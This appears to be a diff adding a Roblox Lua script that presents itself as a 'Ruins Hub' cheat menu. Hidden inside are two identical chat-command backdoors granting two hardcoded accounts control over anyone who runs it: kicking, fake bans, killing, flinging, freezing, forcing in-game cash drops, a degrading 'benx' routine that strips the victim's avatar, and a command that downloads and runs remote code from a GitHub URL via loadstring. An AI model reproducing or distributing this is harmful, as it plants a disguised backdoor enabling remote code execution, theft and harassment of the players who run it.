@@ -1,0 +1,381 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local RuinsHub = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Mods = Instance.new("Folder")
+local UICorner = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+
+--Properties:
+
+RuinsHub.Name = "Ruins Hub"
+RuinsHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+RuinsHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = RuinsHub
+Frame.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
+Frame.Position = UDim2.new(0.293460011, 0, 0.240993798, 0)
+Frame.Size = UDim2.new(0, 738, 0, 417)
+
+Mods.Name = "Mods"
+Mods.Parent = Frame
+
+UICorner.CornerRadius = UDim.new(0.00999999978, 8)
+UICorner.Parent = Frame
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(106, 106, 106)), ColorSequenceKeypoint.new(0.48, Color3.fromRGB(240, 240, 240)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(106, 106, 106))}
+UIGradient.Parent = Frame
+
+-- Scripts:
+
+local function LPRM_fake_script() -- Frame.Draggable 
+	local script = Instance.new('LocalScript', Frame)
+
+	script.Parent.Active = true
+	script.Parent.Selectable = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(LPRM_fake_script)()
+local function BMMB_fake_script() -- Frame.AdminManager 
+	local script = Instance.new('LocalScript', Frame)
+
+	if script.Parent.Mods:FindFirstChild(game.Players.LocalPlayer.Name) then
+		script.DHA:Destroy()
+		script.DHB:Destroy()
+	end
+	
+	
+end
+coroutine.wrap(BMMB_fake_script)()
+local function SJKHHZJ_fake_script() -- nil.DHA 
+	local script = Instance.new('LocalScript', nil)
+
+	local owner = game.Players:WaitForChild("aspectzisaw") --Rename "aczd28" to your username and put it in StartercharacterScript
+	
+	local freeze = function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true 
+	end --Freeze Command make player cant move
+	
+	local unfreeze = function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	end --Unfreeze make player can move
+	
+	
+	function executeFaded()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+	end
+	
+	
+	function dropCash()
+		game.ReplicatedStorage.MainEvent:FireServer("DropMoney", "10000")
+	end
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":freeze .") then
+			if game.Players.LocalPlayer ~= owner then
+				freeze() --Call the freeze script
+			end
+		end
+	end)
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":unfreeze .") then
+			if game.Players.LocalPlayer ~= owner then
+				unfreeze() --Call the unfreeze script
+			end
+		end
+	end)
+	
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":faded .") then
+			if game.Players.LocalPlayer ~= owner then
+				executeFaded() --Call the unfreeze script
+			end
+		end
+	end)
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":dropcash .") then
+			if game.Players.LocalPlayer ~= owner then
+				dropCash() --Call the unfreeze script
+			end
+		end
+	end)
+	
+	--Above me is all freeze and unfreeze script
+	
+	owner.Chatted:Connect(function(cht)
+		if game.Players.LocalPlayer ~= owner  then
+			if cht:match(":kick .") then
+				game.Players.LocalPlayer:Kick("You Have Been Kicked If you think this is abuse report it in the discord.") --This the kicked message change it to any you want
+			end
+		end
+	end) --Kick Script
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":benx .") then
+			if game.Players.LocalPlayer ~= owner then --Down that is a text "this is good" Change it to anything you want when the player get benx
+				wait(0) local A_1 = "This is good" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+				game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = owner.Character.HumanoidRootPart
+				local benxed = true
+				while benxed == true do
+					local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+					pcall(function()
+						hummy.Parent.Pants:Destroy()
+					end)
+					pcall(function()
+						hummy.Parent.Shirt:Destroy()
+					end)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame + owner.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+					wait(0.1)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+				end
+			end
+		end
+	end) --Benx Script
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":kill .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer.Character.Humanoid.Health:Destroy()
+			end
+		end
+	end) -- kill script
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":ban .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer:Kick("PERMA BAN")
+			end
+		end
+	end) -- Fake Ban
+	
+	owner.Chatted:connect(function(cht)
+		if cht:match(":bring .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(owner.Character.UpperTorso.Position)
+			end
+		end
+	end) --Bring script
+	
+	owner.Chatted:connect(function(cht)
+		if cht:match(":fling .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+				local power = 99999 -- change this amount of fling power how much you want fling power you want
+	
+				game:GetService('RunService').Stepped:connect(function()
+					game.Players.LocalPlayer.Character.Head.CanCollide = false
+					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+				end)
+				wait(.1)
+				local bambam = Instance.new("BodyThrust")
+				bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+				bambam.Force = Vector3.new(power,0,power)
+				bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+			end
+		end
+	end) --fling script
+	
+	
+	
+end
+coroutine.wrap(SJKHHZJ_fake_script)()
+local function QZQRQAB_fake_script() -- nil.DHB 
+	local script = Instance.new('LocalScript', nil)
+
+	local owner = game.Players:WaitForChild("Omgnialol") --Rename "aczd28" to your username and put it in StartercharacterScript
+	
+	local freeze = function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true 
+	end --Freeze Command make player cant move
+	
+	local unfreeze = function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	end --Unfreeze make player can move
+	
+	
+	function executeFaded()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+	end
+	
+	
+	function dropCash()
+		game.ReplicatedStorage.MainEvent:FireServer("DropMoney", "10000")
+	end
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":freeze .") then
+			if game.Players.LocalPlayer ~= owner then
+				freeze() --Call the freeze script
+			end
+		end
+	end)
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":unfreeze .") then
+			if game.Players.LocalPlayer ~= owner then
+				unfreeze() --Call the unfreeze script
+			end
+		end
+	end)
+	
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":faded .") then
+			if game.Players.LocalPlayer ~= owner then
+				executeFaded() --Call the unfreeze script
+			end
+		end
+	end)
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":dropcash .") then
+			if game.Players.LocalPlayer ~= owner then
+				dropCash() --Call the unfreeze script
+			end
+		end
+	end)
+	
+	--Above me is all freeze and unfreeze script
+	
+	owner.Chatted:Connect(function(cht)
+		if game.Players.LocalPlayer ~= owner  then
+			if cht:match(":kick .") then
+				game.Players.LocalPlayer:Kick("You Have Been Kicked If you think this is abuse report it in the discord.") --This the kicked message change it to any you want
+			end
+		end
+	end) --Kick Script
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":benx .") then
+			if game.Players.LocalPlayer ~= owner then --Down that is a text "this is good" Change it to anything you want when the player get benx
+				wait(0) local A_1 = "This is good" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+				game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = owner.Character.HumanoidRootPart
+				local benxed = true
+				while benxed == true do
+					local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+					pcall(function()
+						hummy.Parent.Pants:Destroy()
+					end)
+					pcall(function()
+						hummy.Parent.Shirt:Destroy()
+					end)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame + owner.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+					wait(0.1)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+				end
+			end
+		end
+	end) --Benx Script
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":kill .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer.Character.Humanoid.Health:Destroy()
+			end
+		end
+	end) -- kill script
+	
+	owner.Chatted:Connect(function(cht)
+		if cht:match(":ban .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer:Kick("PERMA BAN")
+			end
+		end
+	end) -- Fake Ban
+	
+	owner.Chatted:connect(function(cht)
+		if cht:match(":bring .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(owner.Character.UpperTorso.Position)
+			end
+		end
+	end) --Bring script
+	
+	owner.Chatted:connect(function(cht)
+		if cht:match(":fling .") then
+			if game.Players.LocalPlayer ~= owner then
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+				local power = 99999 -- change this amount of fling power how much you want fling power you want
+	
+				game:GetService('RunService').Stepped:connect(function()
+					game.Players.LocalPlayer.Character.Head.CanCollide = false
+					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+				end)
+				wait(.1)
+				local bambam = Instance.new("BodyThrust")
+				bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+				bambam.Force = Vector3.new(power,0,power)
+				bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+			end
+		end
+	end) --fling script
+	
+	
+	
+end
+coroutine.wrap(QZQRQAB_fake_script)()
+local function XSPTUK_fake_script() -- Frame.AManager 
+	local script = Instance.new('LocalScript', Frame)
+
+	while wait(1) do
+		for i,v in pairs(script.Parent.Mods:GetChildren()) do
+			if game.Workspace.Players:FindFirstChild(v.Name) then
+				local name = game.Players:GetPlayerFromCharacter(game.Workspace.Players:FindFirstChild(v.Name)).DisplayName
+				game.Workspace.Players:FindFirstChild(v.Name).Humanoid.DisplayName = "[👑]".. name
+			end
+		end
+	end
+end
+coroutine.wrap(XSPTUK_fake_script)()
+local function URQXYXW_fake_script() -- Frame.Handler 
+	local script = Instance.new('LocalScript', Frame)
+
+	function Notifaction(Title, Text, Duration)
+		local CoreGui = game:GetService("StarterGui")
+	
+		CoreGui:SetCore("SendNotification", {
+			Title = Title;
+			Text = Text;
+			Duration = Duration;
+			--Callback here
+			Button1 = "Yes";
+			Button2 = "No";
+		})
+	end
+	
+	
+	function Init()
+		Notifaction("Ruin Ware", "Hopefully you're enjoying!", 3)
+	end
+	
+	local uis = game:GetService("UserInputService")
+	
+	uis.InputBegan:Connect(function(input, processed)
+		if processed then
+			return
+		end
+		if input.KeyCode == Enum.KeyCode.V then
+			script.Parent.Visible = not script.Parent.Visible
+		end
+	end)
+	
+	
+	
+	
+	
+	
+	
+	
+	Init()
+end
+coroutine.wrap(URQXYXW_fake_script)()
